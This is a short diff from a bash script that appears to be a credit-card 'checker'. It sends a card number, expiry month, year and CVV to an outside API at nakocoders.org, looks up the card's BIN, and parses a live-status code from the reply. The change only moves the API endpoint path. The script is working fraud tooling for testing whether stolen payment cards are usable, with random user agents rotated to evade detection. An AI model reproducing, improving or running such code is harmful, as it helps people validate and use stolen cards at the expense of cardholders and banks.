@@ -31,7 +31,7 @@ tatsumi(){
     ua=$(cat ua.txt | sort -R | head -1)
     duration=$SECONDS
     SECONDS=0
-    curlnya=$(curl -s "http://api.nakocoders.org/index.php?num=$1&bulan=$2&tahun=$3&ccvna=$4" -L)
+    curlnya=$(curl -s "http://api.nakocoders.org/cc/api.php?num=$1&bulan=$2&tahun=$3&ccvna=$4" -L)
     binna=$(curl -s "https://lookup.binlist.net/$1" -L)
     livena=$(echo $curlnya | grep -Po '(?<="code":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
     bincc=$(echo $binna | grep -Po '(?<="name":)[^,]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{\|}\)//g')
